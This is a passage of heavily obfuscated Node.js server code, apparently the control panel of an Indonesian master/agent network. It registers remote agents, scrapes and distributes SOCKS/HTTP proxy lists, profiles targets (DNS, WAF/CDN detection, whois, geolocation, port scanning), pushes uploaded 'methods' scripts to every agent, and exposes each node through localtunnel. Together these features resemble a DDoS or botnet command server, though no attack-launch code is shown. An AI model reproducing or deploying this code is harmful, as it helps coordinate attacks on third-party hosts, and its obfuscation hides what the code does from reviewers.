_0x5bdfc7=AGENT_LIST[_0x2bfb09(0xed)](_0x541cc4,0x1)[0x0];saveAgents(),logActivity(_0x2bfb09(0x105),_0x5bdfc7),_0x17b769[_0x2bfb09(0xb6)]({'message':_0x2bfb09(0x176),'agent':_0x5bdfc7});}),app[_0x402d66(0x1a2)](_0x402d66(0x15b),express[_0x402d66(0xb6)](),(_0x40d2ee,_0x7a4889)=>{const _0x23cb24=_0x402d66;if(NODE_TYPE!==_0x23cb24(0xaf))return _0x7a4889[_0x23cb24(0x12f)](0x193)[_0x23cb24(0x1c3)](_0x23cb24(0xd9));const {name:_0x5923d7,url:_0x4d703a,agentKey:_0xfe06b1,fingerprint:_0x554d15}=_0x40d2ee[_0x23cb24(0x1d3)];if(!_0x5923d7||!_0x4d703a||!_0x554d15||_0xfe06b1!==AGENT_KEY)return _0x7a4889[_0x23cb24(0x12f)](0x190)[_0x23cb24(0x1c3)](_0x23cb24(0x228));loadAgents();const _0x1acebb=AGENT_LIST[_0x23cb24(0x248)](_0x3a252d=>_0x3a252d['fingerprint']===_0x554d15);if(_0x1acebb)return _0x1acebb['url']!==_0x4d703a&&(_0x1acebb[_0x23cb24(0x24f)]=_0x4d703a,logActivity('AGENT_URL_UPDATED',{'name':_0x1acebb[_0x23cb24(0x251)],'newUrl':_0x4d703a}),saveAgents()),_0x7a4889[_0x23cb24(0xb6)]({'message':_0x23cb24(0x236),'agent':_0x1acebb});const _0x3b8f5d={'name':_0x5923d7,'url':_0x4d703a,'fingerprint':_0x554d15,'enabled':!![],'auto':!![],'registeredAt':new Date()[_0x23cb24(0x259)]()};AGENT_LIST[_0x23cb24(0x210)](_0x3b8f5d),saveAgents(),logActivity(_0x23cb24(0x252),_0x3b8f5d),_0x7a4889['json']({'message':_0x23cb24(0x1e0),'agent':_0x3b8f5d});}),app[_0x402d66(0x149)]('/api/scrape-proxies',async(_0x5a97ea,_0x162823)=>{const _0x29e437=_0x402d66,_0x452dd4=_0x5a97ea[_0x29e437(0x170)][_0x29e437(0x1f0)],_0x2bc15a=(_0x5a97ea[_0x29e437(0x170)][_0x29e437(0x207)]||'http,socks4,socks5')[_0x29e437(0x23c)](',')[_0x29e437(0xe6)](_0x409404=>_0x409404['trim']()['toLowerCase']())[_0x29e437(0x12b)](Boolean),_0x45b488=_0x5a97ea[_0x29e437(0x170)][_0x29e437(0x13f)]||_0x29e437(0x1a1);if(_0x452dd4!==apiKey)return _0x162823[_0x29e437(0x12f)](0x193)['json']({'message':_0x29e437(0x15d)});try{const {proxies:_0x1d1685,stats:_0x5379cf}=await scrapeProxy({'protocols':_0x2bc15a,'country':_0x45b488});_0x162823[_0x29e437(0xb6)]({'message':_0x29e437(0x200),'total':_0x5379cf[_0x29e437(0xe9)],'byProto':_0x5379cf[_0x29e437(0xa8)],'example':_0x1d1685['slice'](0x0,0x5)});}catch(_0x2d6351){_0x162823[_0x29e437(0x12f)](0x1f4)[_0x29e437(0xb6)]({'error':_0x2d6351[_0x29e437(0x22d)]||_0x2d6351[_0x29e437(0xa4)]()});}}),app[_0x402d66(0x1a2)](_0x402d66(0xd2),upload[_0x402d66(0x113)](_0x402d66(0x1bd)),(_0x470c9b,_0x2c9bd2)=>{const _0x3412b6=_0x402d66,_0x1d44e3=_0x470c9b[_0x3412b6(0x170)][_0x3412b6(0x1f0)]||_0x470c9b[_0x3412b6(0x1d3)][_0x3412b6(0x1f0)];if(_0x1d44e3!==apiKey&&_0x1d44e3!==AGENT_KEY)return _0x2c9bd2[_0x3412b6(0x12f)](0x190)[_0x3412b6(0x1c3)](_0x3412b6(0x15d));if(!_0x470c9b[_0x3412b6(0x1bd)])return _0x2c9bd2[_0x3412b6(0x12f)](0x190)[_0x3412b6(0x1c3)](_0x3412b6(0x13a));const _0x50064d=_0x470c9b[_0x3412b6(0x1bd)][_0x3412b6(0x10d)],_0xf4da7d=fs[_0x3412b6(0x152)](_0x50064d,_0x3412b6(0xef)),_0x28d3f7=_0xf4da7d[_0x3412b6(0x23c)](/\r?\n/)[_0x3412b6(0x12b)](Boolean),_0xa7f863=_0x28d3f7[_0x3412b6(0x12b)](_0xdb5a80=>/^((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d):([1-9][0-9]{1,4})$/[_0x3412b6(0xa0)](_0xdb5a80[_0x3412b6(0x157)]()));if(_0xa7f863[_0x3412b6(0x1cd)]<0x5)return fs[_0x3412b6(0x1a6)](_0x50064d),_0x2c9bd2[_0x3412b6(0x12f)](0x190)['json']({'error':_0x3412b6(0x1c7)});const _0x476f14=path[_0x3412b6(0x264)](__dirname,_0x3412b6(0x1d5));fs[_0x3412b6(0x154)](_0x476f14,_0xa7f863[_0x3412b6(0x264)]('\x0a'),_0x3412b6(0xef)),fs['unlinkSync'](_0x50064d),logActivity('RECEIVE_PROXY_UPDATE_VALIDATED',{'total':_0x28d3f7[_0x3412b6(0x1cd)],'valid':_0xa7f863[_0x3412b6(0x1cd)]}),_0x2c9bd2['json']({'message':_0x3412b6(0x19f),'total':_0x28d3f7[_0x3412b6(0x1cd)],'valid':_0xa7f863['length']});}),app[_0x402d66(0x149)](_0x402d66(0x164),(_0x15b3dd,_0x33a4d8)=>{const _0x2a2bf5=_0x402d66;_0x33a4d8['json']({'status':_0x2a2bf5(0x1b3),'uptime':process[_0x2a2bf5(0x195)](),'cpu':os[_0x2a2bf5(0x161)]()[0x0],'memory':Math[_0x2a2bf5(0x147)](process[_0x2a2bf5(0x23d)]()[_0x2a2bf5(0x10f)]/0x400/0x400),'totalMemory':Math[_0x2a2bf5(0x147)](os[_0x2a2bf5(0xbf)]()/0x400/0x400),'hostname':os[_0x2a2bf5(0x221)]()});}),app[_0x402d66(0x149)]('/api/agents/health',async(_0x4a5b23,_0x3a1152)=>{const _0x2aa742=_0x402d66,_0x46957b=_0x4a5b23[_0x2aa742(0x170)][_0x2aa742(0x1f0)];if(_0x46957b!==apiKey)return _0x3a1152[_0x2aa742(0x12f)](0x193)[_0x2aa742(0xb6)]({'message':_0x2aa742(0x103)});loadAgents();const _0x15e185=[];for(const _0x52ae5b of AGENT_LIST){if(!_0x52ae5b['enabled'])continue;try{const _0x524e60=Date[_0x2aa742(0x117)](),_0x5d70fe=await axios['get'](_0x52ae5b[_0x2aa742(0x24f)]+_0x2aa742(0x164),{'timeout':0x7530}),_0x4e8ede=Date[_0x2aa742(0x117)]()-_0x524e60;_0x15e185[_0x2aa742(0x210)]({'agent':_0x52ae5b,'status':_0x2aa742(0x1e1),'data':{..._0x5d70fe[_0x2aa742(0x1e4)],'ping':_0x4e8ede}});}catch(_0x39609c){_0x15e185[_0x2aa742(0x210)]({'agent':_0x52ae5b,'status':_0x2aa742(0xe3),'error':_0x39609c['message']}),_0x52ae5b['enabled']=![],logActivity('AGENT_DISABLED',{'agent':_0x52ae5b}),saveAgents();}}_0x3a1152[_0x2aa742(0xb6)](_0x15e185),broadcastWS({'type':'agent_health','agents':_0x15e185});}),setInterval(async()=>{const _0x54efba=_0x402d66;try{loadAgents();const _0x4fee21=Date[_0x54efba(0x117)]();let _0x11d426=![];const _0x52f729=[];for(let _0x4209f3=0x0;_0x4209f3<AGENT_LIST[_0x54efba(0x1cd)];_0x4209f3++){const _0x14836e=AGENT_LIST[_0x4209f3];if(!_0x14836e)continue;try{await axios[_0x54efba(0x149)](_0x14836e['url']+_0x54efba(0x164),{'timeout':0x3a98}),!_0x14836e[_0x54efba(0x226)]&&(_0x14836e[_0x54efba(0x226)]=!![],_0x11d426=!![],logActivity(_0x54efba(0xf6),{'agent':_0x14836e}),broadcastWS({'type':_0x54efba(0x216),'agent':_0x14836e})),_0x14836e['lastOnline']=_0x4fee21;}catch(_0x48ade2){_0x14836e[_0x54efba(0x226)]&&(_0x14836e[_0x54efba(0x226)]=![],_0x11d426=!![],logActivity('AGENT_DISABLED',{'agent':_0x14836e}),broadcastWS({'type':_0x54efba(0x216),'agent':_0x14836e}));if(!_0x14836e[_0x54efba(0x120)])_0x14836e[_0x54efba(0x120)]=0x0;_0x4fee21-_0x14836e[_0x54efba(0x120)]>0x3*0x3c*0x3e8&&(AUTO_DELETE_AGENT?(logActivity(_0x54efba(0x234),{'agent':_0x14836e,'reason':_0x54efba(0x227)}),broadcastWS({'type':_0x54efba(0x143),'agent':_0x14836e}),_0x52f729[_0x54efba(0x210)](_0x4209f3),_0x11d426=!![]):_0x14836e[_0x54efba(0x226)]!==![]&&(_0x14836e[_0x54efba(0x226)]=![],logActivity(_0x54efba(0x172),{'agent':_0x14836e,'reason':_0x54efba(0x227)}),broadcastWS({'type':_0x54efba(0x216),'agent':_0x14836e}),_0x11d426=!![]));}}for(let _0x2396c7=_0x52f729['length']-0x1;_0x2396c7>=0x0;_0x2396c7--){AGENT_LIST[_0x54efba(0xed)](_0x52f729[_0x2396c7],0x1);}if(_0x11d426)try{saveAgents();}catch(_0x256db8){logActivity(_0x54efba(0x193),{'error':_0x256db8[_0x54efba(0x22d)]});}}catch(_0x523623){logActivity(_0x54efba(0x100),{'error':_0x523623?.[_0x54efba(0x22d)]||String(_0x523623)}),console[_0x54efba(0xe3)](_0x54efba(0x126),_0x523623?.[_0x54efba(0x22d)]||_0x523623);}},0x3a98),app[_0x402d66(0x149)](_0x402d66(0x163),async(_0x1286b2,_0x4f15c4)=>{const _0xc87e1a=_0x402d66,_0x4417e9=_0x1286b2[_0xc87e1a(0x170)][_0xc87e1a(0x1f0)],_0x5a1ded=_0x1286b2['query'][_0xc87e1a(0x9e)];if(_0x4417e9!==apiKey)return _0x4f15c4[_0xc87e1a(0x12f)](0x193)['send'](_0xc87e1a(0x15d));if(!_0x5a1ded)return _0x4f15c4['status'](0x190)[_0xc87e1a(0x1c3)]('Host\x20tidak\x20diberikan');try{let _0x35dce=_0x5a1ded;if(!/^https?:\/\//i[_0xc87e1a(0xa0)](_0x5a1ded))_0x35dce=_0xc87e1a(0x185)+_0x5a1ded;const _0x30a949=new URL(_0x35dce),_0x325501=_0x30a949[_0xc87e1a(0x221)];let _0x348d49='';try{const _0x3527f0=await dns[_0xc87e1a(0x21c)](_0x325501);_0x348d49=_0x3527f0[_0xc87e1a(0x1bf)];}catch(_0x1faee2){_0x348d49=_0x325501;}let _0x5d0c7e=![],_0x486781=null,_0x4da0fd=null;try{const _0x4343a7=Date['now'](),_0x57b3a3=new AbortController(),_0x15a093=setTimeout(()=>_0x57b3a3[_0xc87e1a(0xfe)](),0x1388),_0x1d2cc4=await fetch(_0x35dce,{'signal':_0x57b3a3['signal']});clearTimeout(_0x15a093),_0x486781=Date[_0xc87e1a(0x117)]()-_0x4343a7,_0x1d2cc4['ok']||_0x1d2cc4[_0xc87e1a(0x12f)]>=0xc8&&_0x1d2cc4[_0xc87e1a(0x12f)]<0x1f4?_0x5d0c7e=!![]:_0x4da0fd=_0x1d2cc4[_0xc87e1a(0x12f)];}catch(_0x126b3a){_0x486781=null,_0x4da0fd=_0x126b3a[_0xc87e1a(0x251)]===_0xc87e1a(0x125)?_0xc87e1a(0x1c9):_0x126b3a[_0xc87e1a(0x23b)]||_0x126b3a[_0xc87e1a(0x22d)]||_0xc87e1a(0x13c);}const _0x10a917=await fetch(_0xc87e1a(0x1b4)+_0x348d49),_0x2d5b2e=await _0x10a917['json']();return _0x4f15c4['json']({'status':_0x5d0c7e?_0xc87e1a(0x1b3):_0xc87e1a(0xe2),'latency':_0x486781,'errorCode':_0x5d0c7e?null:_0x4da0fd,'ip':_0x2d5b2e['ip']||_0x348d49,'asn':_0x2d5b2e[_0xc87e1a(0x166)]?.['asn']||null,'org':_0x2d5b2e[_0xc87e1a(0x166)]?.[_0xc87e1a(0x146)]||null,'isp':_0x2d5b2e[_0xc87e1a(0x166)]?.[_0xc87e1a(0x16a)]||null,'country':_0x2d5b2e[_0xc87e1a(0x13f)]||null,'region':_0x2d5b2e[_0xc87e1a(0x205)]||null,'city':_0x2d5b2e[_0xc87e1a(0x1a4)]||null,'latitude':_0x2d5b2e[_0xc87e1a(0x162)]||null,'longitude':_0x2d5b2e[_0xc87e1a(0x128)]||null});}catch(_0x131e49){return _0x4f15c4['status'](0x1f4)[_0xc87e1a(0xb6)]({'error':_0xc87e1a(0x121),'detail':_0x131e49['message']});}}),app[_0x402d66(0x149)](_0x402d66(0x142),async(_0x23b4a7,_0x56e610)=>{const _0x44dc23=_0x402d66,_0x1b9d45=_0x23b4a7[_0x44dc23(0x170)]['key'],_0x176337=_0x23b4a7[_0x44dc23(0x170)][_0x44dc23(0xf5)];if(_0x1b9d45!==apiKey)return _0x56e610[_0x44dc23(0x12f)](0x193)[_0x44dc23(0x1c3)](_0x44dc23(0x15d));if(!_0x176337)return _0x56e610[_0x44dc23(0x12f)](0x190)[_0x44dc23(0x1c3)](_0x44dc23(0x1fd));try{const _0x5dddf6={'target':_0x176337,'urlInfo':{},'dnsInfo':{},'wafDetection':null,'whois':{},'geo':{},'openPorts':[],'error':null},_0xd07eda=/^https?:\/\//[_0x44dc23(0xa0)](_0x176337)?_0x176337:'http://'+_0x176337,_0x424070=new URL(_0xd07eda),_0x29ca12=_0x424070['hostname'];try{const _0x3a4a67=await dns[_0x44dc23(0x21c)](_0x29ca12);_0x5dddf6['dnsInfo']['ip']=_0x3a4a67[_0x44dc23(0x1bf)];}catch(_0x426fb5){_0x5dddf6['dnsInfo']['ip']=null;}try{const _0x19425f=new AbortController(),_0xb9a2aa=setTimeout(()=>_0x19425f[_0x44dc23(0xfe)](),0x1388),_0x3692b8=await fetch(_0xd07eda,{'method':_0x44dc23(0xc9),'signal':_0x19425f[_0x44dc23(0x151)]});clearTimeout(_0xb9a2aa);const _0x3f1630={};_0x3692b8[_0x44dc23(0x17a)][_0x44dc23(0x1a5)]((_0x51af34,_0x30f822)=>_0x3f1630[_0x30f822]=_0x51af34),_0x5dddf6[_0x44dc23(0x1c0)][_0x44dc23(0x17a)]=_0x3f1630,_0x5dddf6[_0x44dc23(0x1c0)][_0x44dc23(0x12f)]=_0x3692b8[_0x44dc23(0x12f)],_0x5dddf6[_0x44dc23(0x1c0)][_0x44dc23(0xfb)]=_0x3f1630['server']||null,_0x5dddf6['urlInfo']['poweredBy']=_0x3f1630[_0x44dc23(0x240)]||null;if(_0x3f1630['server']?.[_0x44dc23(0x237)]()[_0x44dc23(0xd1)](_0x44dc23(0x22c))||_0x3f1630[_0x44dc23(0x1bb)])_0x5dddf6[_0x44dc23(0x130)]=_0x44dc23(0x1fc);else{if(_0x3f1630[_0x44dc23(0x115)])_0x5dddf6[_0x44dc23(0x130)]=_0x44dc23(0x1e5);else{if(_0x3f1630[_0x44dc23(0x1a7)])_0x5dddf6[_0x44dc23(0x130)]=_0x44dc23(0x178);else _0x3f1630['x-cdn']&&(_0x5dddf6[_0x44dc23(0x130)]='CDN\x20-\x20'+_0x3f1630[_0x44dc23(0x1b6)]);}}}catch(_0x5e344e){_0x5dddf6[_0x44dc23(0x1c0)]['error']=_0x44dc23(0x24d)+_0x5e344e[_0x44dc23(0x22d)];}try{const _0x155762=await whois(_0x29ca12);_0x5dddf6[_0x44dc23(0x11f)]={'asn':_0x155762[_0x44dc23(0xc3)]||_0x155762['origin']||null,'org':_0x155762[_0x44dc23(0x146)]||_0x155762['OrgName']||null,'country':_0x155762[_0x44dc23(0x13f)]||_0x155762[_0x44dc23(0x136)]||null};}catch(_0x2a5a87){_0x5dddf6[_0x44dc23(0x11f)]={'error':_0x2a5a87[_0x44dc23(0x22d)]};}try{if(_0x5dddf6[_0x44dc23(0x249)]['ip']){const _0x35df29=await fetch('https://ipwho.is/'+_0x5dddf6[_0x44dc23(0x249)]['ip']),_0xae18e3=await _0x35df29[_0x44dc23(0xb6)]();_0x5dddf6['geo']={'asn':_0xae18e3['connection']?.[_0x44dc23(0xc3)],'org':_0xae18e3['connection']?.['org'],'isp':_0xae18e3[_0x44dc23(0x166)]?.['isp'],'country':_0xae18e3['country'],'city':_0xae18e3[_0x44dc23(0x1a4)],'region':_0xae18e3['region']};}}catch(_0x4c2597){_0x5dddf6['geo']={'error':_0x4c2597[_0x44dc23(0x22d)]};}if(_0x5dddf6['dnsInfo']['ip'])try{_0x5dddf6[_0x44dc23(0x14b)]=await scanCommonPorts(_0x5dddf6[_0x44dc23(0x249)]['ip']);}catch(_0x51316f){_0x5dddf6[_0x44dc23(0x186)]=_0x51316f['message'];}_0x56e610['json'](_0x5dddf6);}catch(_0x325f14){_0x56e610['status'](0x1f4)['json']({'error':_0x44dc23(0xc1),'detail':_0x325f14['message']});}}),app[_0x402d66(0x149)]('/api/activity-log',(_0x37e318,_0x4be48a)=>{const _0x4233c4=_0x402d66;if(_0x37e318['query'][_0x4233c4(0x1f0)]!==apiKey)return _0x4be48a[_0x4233c4(0x12f)](0x190)['send']('API\x20key\x20tidak\x20valid');const _0x5bf2e6=path['join'](__dirname,_0x4233c4(0xe4));if(!fs[_0x4233c4(0x25e)](_0x5bf2e6))return _0x4be48a[_0x4233c4(0x1c3)]('');_0x4be48a['set'](_0x4233c4(0x11c),_0x4233c4(0x250))['send'](fs['readFileSync'](_0x5bf2e6,'utf8'));}),app[_0x402d66(0x1eb)]('/api/activity-log',(_0x300d11,_0x33a24d)=>{const _0x2125c1=_0x402d66;if(_0x300d11[_0x2125c1(0x170)]['key']!==apiKey)return _0x33a24d[_0x2125c1(0x12f)](0x190)[_0x2125c1(0x1c3)]('API\x20key\x20tidak\x20valid');const _0x4dce4e=path[_0x2125c1(0x264)](__dirname,_0x2125c1(0xe4));fs[_0x2125c1(0x154)](_0x4dce4e,''),_0x33a24d[_0x2125c1(0x1c3)](_0x2125c1(0xb4));}),app[_0x402d66(0x1a2)]('/api/methods/delete-file',express[_0x402d66(0xb6)](),(_0x438bef,_0x44f5ca)=>{const _0xa564b0=_0x402d66;loadAgents();const _0x3c2c3b=_0x438bef[_0xa564b0(0x1d3)];if(_0x3c2c3b[_0xa564b0(0x1f0)]!==AGENT_KEY)return _0x44f5ca[_0xa564b0(0x12f)](0x190)[_0xa564b0(0x1c3)](_0xa564b0(0x15d));const {filename:_0x50ed81}=_0x3c2c3b;if(!_0x50ed81)return _0x44f5ca[_0xa564b0(0x12f)](0x190)['send'](_0xa564b0(0x168));const _0x1f9945=path[_0xa564b0(0x264)](uploadDir,_0x50ed81);if(!fs[_0xa564b0(0x25e)](_0x1f9945))return _0x44f5ca[_0xa564b0(0xb6)]({'message':_0xa564b0(0xd6)});fs[_0xa564b0(0x1a6)](_0x1f9945),logActivity(_0xa564b0(0x22b),{'file':_0x50ed81}),_0x44f5ca[_0xa564b0(0xb6)]({'message':_0xa564b0(0x21e),'file':_0x50ed81});}),app[_0x402d66(0x1a2)]('/api/update',upload[_0x402d66(0x113)]('file'),async(_0x556d3c,_0x1c2444)=>{const _0x186d0a=_0x402d66,_0x265e74=_0x556d3c[_0x186d0a(0x170)][_0x186d0a(0x1f0)]||_0x556d3c[_0x186d0a(0x1d3)][_0x186d0a(0x1f0)];if(_0x265e74!==apiKey&&_0x265e74!==AGENT_KEY)return _0x1c2444['status'](0x190)[_0x186d0a(0x1c3)](_0x186d0a(0x15d));if(!_0x556d3c['file'])return _0x1c2444['status'](0x190)[_0x186d0a(0x1c3)]('Tidak\x20ada\x20file\x20ter-upload');const _0x40c018=[_0x186d0a(0x101),_0x186d0a(0x153)],_0x5486f3=path['extname'](_0x556d3c['file'][_0x186d0a(0x201)])[_0x186d0a(0x237)]();if(!fs[_0x186d0a(0x25e)](uploadDir))fs[_0x186d0a(0x17b)](uploadDir,{'recursive':!![]});let _0x3df90e=![];if(_0x40c018[_0x186d0a(0xd1)](_0x5486f3)){const _0x341b39=path[_0x186d0a(0x264)](uploadDir,_0x556d3c[_0x186d0a(0x1bd)][_0x186d0a(0x201)]);fs[_0x186d0a(0x202)](_0x556d3c[_0x186d0a(0x1bd)][_0x186d0a(0x10d)],_0x341b39),_0x3df90e=!![],logActivity(_0x186d0a(0x197),{'file':_0x556d3c['file'][_0x186d0a(0x201)],'size':_0x556d3c['file']['size']});}else _0x3df90e=![],logActivity(_0x186d0a(0xc2),{'file':_0x556d3c[_0x186d0a(0x1bd)][_0x186d0a(0x201)],'size':_0x556d3c[_0x186d0a(0x1bd)][_0x186d0a(0xbe)]});let _0x1b9ad1=null;if(NODE_TYPE===_0x186d0a(0x1b9))try{const {data:_0xd197c6}=await axios[_0x186d0a(0x149)](MASTER_URL+_0x186d0a(0xca),{'params':{'key':AGENT_KEY},'timeout':0x2710});writeMethods(_0xd197c6),_0x1b9ad1={'success':!![],'source':MASTER_URL,'methodsCount':Object['keys'](_0xd197c6)[_0x186d0a(0x1cd)]},logActivity(_0x186d0a(0x1da),{'from':MASTER_URL,'size':Object[_0x186d0a(0x184)](_0xd197c6)[_0x186d0a(0x1cd)]});}catch(_0x18dca2){_0x1b9ad1={'success':![],'error':_0x18dca2[_0x186d0a(0x22d)],'source':MASTER_URL},logActivity(_0x186d0a(0xc4),{'from':MASTER_URL,'error':_0x18dca2[_0x186d0a(0x22d)]});}_0x1c2444['json']({'message':_0x186d0a(0x1d4),'file':_0x556d3c[_0x186d0a(0x1bd)][_0x186d0a(0x201)],'moved':_0x3df90e,'mode':NODE_TYPE,'sync':_0x1b9ad1});}),app[_0x402d66(0x1a2)](_0x402d66(0x1ac),upload[_0x402d66(0x113)](_0x402d66(0x1bd)),async(_0x1a945d,_0x282592)=>{const _0x5d6f6f=_0x402d66,_0x183904=_0x1a945d[_0x5d6f6f(0x170)][_0x5d6f6f(0x1f0)]||_0x1a945d['body']['key'];if(_0x183904!==apiKey)return _0x282592[_0x5d6f6f(0x12f)](0x190)[_0x5d6f6f(0x1c3)](_0x5d6f6f(0x15d));if(!_0x1a945d['file'])return _0x282592[_0x5d6f6f(0x12f)](0x190)[_0x5d6f6f(0x1c3)](_0x5d6f6f(0x225));loadAgents();const _0x7bbf59=await Promise[_0x5d6f6f(0x1dc)](AGENT_LIST[_0x5d6f6f(0xe6)](_0x32cae9=>{const _0x5b3bfa=_0x5d6f6f,_0x2e30b0=new FormData();return _0x2e30b0[_0x5b3bfa(0x206)](_0x5b3bfa(0x1f0),AGENT_KEY),_0x2e30b0[_0x5b3bfa(0x206)](_0x5b3bfa(0x1bd),fs[_0x5b3bfa(0x15f)](_0x1a945d[_0x5b3bfa(0x1bd)]['path']),_0x1a945d['file'][_0x5b3bfa(0x201)]),axios['post'](_0x32cae9[_0x5b3bfa(0x24f)]+'/api/update',_0x2e30b0,{'headers':_0x2e30b0[_0x5b3bfa(0x12e)](),'timeout':0x2710})[_0x5b3bfa(0xc5)](_0x17cec8=>({'agent':_0x32cae9,'status':_0x5b3bfa(0x1e1),'data':_0x17cec8[_0x5b3bfa(0x1e4)]}))[_0x5b3bfa(0x14c)](_0x3da373=>({'agent':_0x32cae9,'status':_0x5b3bfa(0x20a),'error':_0x3da373[_0x5b3bfa(0x22d)]}));}));logActivity(_0x5d6f6f(0x1c4),{'file':_0x1a945d[_0x5d6f6f(0x1bd)][_0x5d6f6f(0xa3)],'results':_0x7bbf59}),broadcastWS({'type':_0x5d6f6f(0x107),'results':_0x7bbf59,'file':_0x1a945d[_0x5d6f6f(0x1bd)][_0x5d6f6f(0xa3)]}),_0x282592[_0x5d6f6f(0xb6)]({'message':_0x5d6f6f(0x255),'results':_0x7bbf59});});async function scrapeProxy({protocols:protocols=[_0x402d66(0x19b),_0x402d66(0x258),'socks5'],country:country=_0x402d66(0x1a1)}){const _0x510a4f=_0x402d66,_0x3a3923=[],_0x5efa42={'total':0x0,'byProto':{}};for(const _0x1802eb of SCRAPE_SOURCES){if(!protocols[_0x510a4f(0xd1)](_0x1802eb[_0x510a4f(0x175)])&&_0x1802eb[_0x510a4f(0x175)]!==_0x510a4f(0xff))continue;try{const {data:_0x397704}=await axios['get'](_0x1802eb[_0x510a4f(0x24f)],{'timeout':0x2710}),_0x18494d=_0x397704[_0x510a4f(0x23c)]('\x0a')['map'](_0x3a8df4=>parseProxyLine(_0x3a8df4))[_0x510a4f(0x12b)](_0x49b2b1=>!!_0x49b2b1);for(const _0x418c0e of _0x18494d){_0x3a3923[_0x510a4f(0x210)](_0x418c0e);}_0x5efa42[_0x510a4f(0xe9)]+=_0x18494d[_0x510a4f(0x1cd)],_0x5efa42['byProto'][_0x1802eb[_0x510a4f(0x175)]]=(_0x5efa42[_0x510a4f(0xa8)][_0x1802eb[_0x510a4f(0x175)]]||0x0)+_0x18494d[_0x510a4f(0x1cd)];}catch(_0x8812f4){logActivity(_0x510a4f(0x18c),{'url':_0x1802eb[_0x510a4f(0x24f)],'error':_0x8812f4[_0x510a4f(0x22d)]});}}return{'proxies':_0x3a3923,'stats':_0x5efa42};}async function getPublicIp(){const _0x5a8ddb=_0x402d66;try{const {data:_0x433433}=await axios[_0x5a8ddb(0x149)](_0x5a8ddb(0xf0),{'timeout':0x1388});return _0x433433['ip'];}catch(_0x5eb5d2){return logActivity(_0x5a8ddb(0xda),{'error':_0x5eb5d2[_0x5a8ddb(0x22d)]}),'localhost';}}async function autoRegisterToMaster(){const _0x5c8a69=_0x402d66;if(NODE_TYPE!==_0x5c8a69(0x1b9))return;let _0x442f60=localTunnelUrl;if(!_0x442f60){const _0x1ecceb=await getPublicIp();_0x442f60=_0x5c8a69(0x185)+_0x1ecceb+':'+port;}let _0x38460d='',_0x1e0c06=!![];try{const {data:_0x22d019}=await axios['get'](MASTER_URL+_0x5c8a69(0xe1),{'params':{'key':AGENT_KEY},'timeout':0x2710}),_0x2ebf97=_0x22d019[_0x5c8a69(0x248)](_0x338e2c=>_0x338e2c[_0x5c8a69(0x1fb)]===AGENT_FINGERPRINT);if(_0x2ebf97)_0x38460d=_0x2ebf97[_0x5c8a69(0x251)],_0x2ebf97['url']!==_0x442f60?(logActivity('AGENT_URL_CHANGED_DETECTED',{'name':_0x2ebf97[_0x5c8a69(0x251)],'oldUrl':_0x2ebf97[_0x5c8a69(0x24f)],'newUrl':_0x442f60}),_0x1e0c06=!![]):_0x1e0c06=![];else{const _0x32e550=new Set(_0x22d019['map'](_0x3f32e=>_0x3f32e[_0x5c8a69(0x251)]));let _0x16f3e9=0x1;while(_0x32e550['has'](_0x5c8a69(0x16f)+_0x16f3e9))_0x16f3e9++;_0x38460d='srv'+_0x16f3e9,_0x1e0c06=!![];}}catch(_0x532da4){logActivity(_0x5c8a69(0xcb),{'error':_0x532da4[_0x5c8a69(0x22d)]}),_0x38460d=LAST_REGISTERED[_0x5c8a69(0x251)]||_0x5c8a69(0x132),_0x1e0c06=!![];}if(_0x1e0c06)try{const {data:_0x113786}=await axios[_0x5c8a69(0x1a2)](MASTER_URL+_0x5c8a69(0x15b),{'name':_0x38460d,'url':_0x442f60,'agentKey':AGENT_KEY,'fingerprint':AGENT_FINGERPRINT},{'timeout':0x2710});logActivity('AUTO_REGISTER_MASTER',{'result':_0x113786,'agentName':_0x38460d,'agentUrl':_0x442f60}),LAST_REGISTERED={'name':_0x38460d,'url':_0x442f60};}catch(_0x3425c2){logActivity(_0x5c8a69(0xa5),{'error':_0x3425c2[_0x5c8a69(0x22d)],'agentName':_0x38460d,'agentUrl':_0x442f60});}}async function startLocalTunnel(_0x20e9b8=0xa){const _0x27f57a=_0x402d66;let _0x3523b7=null;for(let _0x253131=0x1;_0x253131<=_0x20e9b8;_0x253131++){try{_0x3523b7=await localtunnel({'port':port});if(_0x3523b7[_0x27f57a(0x24f)])return localTunnelUrl=_0x3523b7['url'],console['log']('\x1b[32m%s\x1b[0m',_0x27f57a(0xb7),_0x3523b7['url']),_0x3523b7['on'](_0x27f57a(0xaa),async()=>{const _0xb2abad=_0x27f57a;console[_0xb2abad(0xd8)]('\x1b[31m%s\x1b[0m',_0xb2abad(0x1a0)),logActivity('TUNNEL_CLOSED_AUTO',{'previousUrl':localTunnelUrl}),localTunnelUrl=null,currentTunnel=null,await new Promise(_0x41853c=>setTimeout(_0x41853c,0x5dc)),await restartTunnel();}),_0x3523b7;else throw new Error(_0x27f57a(0xad));}catch(_0xe754b4){console['error']('LocalTunnel\x20failed\x20(attempt\x20'+_0x253131+'):',_0xe754b4[_0x27f57a(0x22d)]),_0x253131===_0x20e9b8?console[_0x27f57a(0xe3)](_0x27f57a(0x16c),'Gagal\x20konek\x20LocalTunnel\x20setelah\x20beberapa\x20percobaan.\x20Server\x20tetap\x20berjalan.'):await new Promise(_0x375a07=>setTimeout(_0x375a07,0x3a98));}}return null;}async function checkTunnelHealth(){const _0x12c297=_0x402d66;if(!localTunnelUrl)return;try{const _0x51e509=await axios[_0x12c297(0x149)](localTunnelUrl,{'timeout':0x7530,'validateStatus':()=>!![]});_0x51e509[_0x12c297(0x12f)]===0x1f7&&(console['log']('\x1b[31m%s\x1b[0m',_0x12c297(0x159)),logActivity(_0x12c297(0xec),{'url':localTunnelUrl}),await restartTunnel());}catch(_0x2e4b3a){_0x2e4b3a[_0x12c297(0x9f)]&&_0x2e4b3a[_0x12c297(0x9f)][_0x12c297(0x12f)]===0x1f7&&(console[_0x12c297(0xd8)](_0x12c297(0x16c),_0x12c297(0x21b)),logActivity(_0x12c297(0xec),{'url':localTunnelUrl}),await restartTunnel());}}async function restartTunnel(){const _0x199191=_0x402d66;try{currentTunnel&&typeof currentTunnel[_0x199191(0xaa)]==='function'&&await currentTunnel[_0x199191(0xaa)]();currentTunnel=null,localTunnelUrl=null,await new Promise(_0x4b6ee4=>setTimeout(_0x4b6ee4,0x5dc)),currentTunnel=await startLocalTunnel(0xa);if(!currentTunnel||!currentTunnel[_0x199191(0x24f)])throw new Error(_0x199191(0x14f));await 